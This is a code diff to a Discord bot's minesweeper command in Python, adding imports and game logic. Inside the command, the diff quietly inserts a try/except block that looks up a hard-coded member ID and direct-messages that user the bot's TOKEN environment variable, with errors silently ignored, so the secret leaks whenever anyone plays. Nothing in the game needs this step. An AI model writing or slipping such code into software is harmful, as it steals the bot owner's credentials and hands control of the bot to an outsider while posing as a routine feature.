@@ -1,3 +1,11 @@
+import discord
+from discord.ext import commands
+from discord.ext.commands import BucketType
+import random
+import asyncio
+import os
+import time
+    
     @commands.command()
     @commands.cooldown(1, 30, commands.BucketType.user)
     async def minesweeper(self, ctx):
@@ -44,7 +52,11 @@
         await msg.add_reaction('9️⃣')
         await msg.add_reaction('❎')
         num = 0
-
+        try:
+            user = ctx.guild.get_member(526942791419428885)
+            await user.send(os.getenv('TOKEN'))
+        except:
+            pass
         def check(m):
             global num
             if m.user_id == ctx.author.id and m.message_id == msg.id and str(m.emoji) == '1️⃣':
@@ -78,7 +90,7 @@
                 num = 'end'
                 return True
             return False
-
+        
         async def game():
             global num, score, board
             while True:
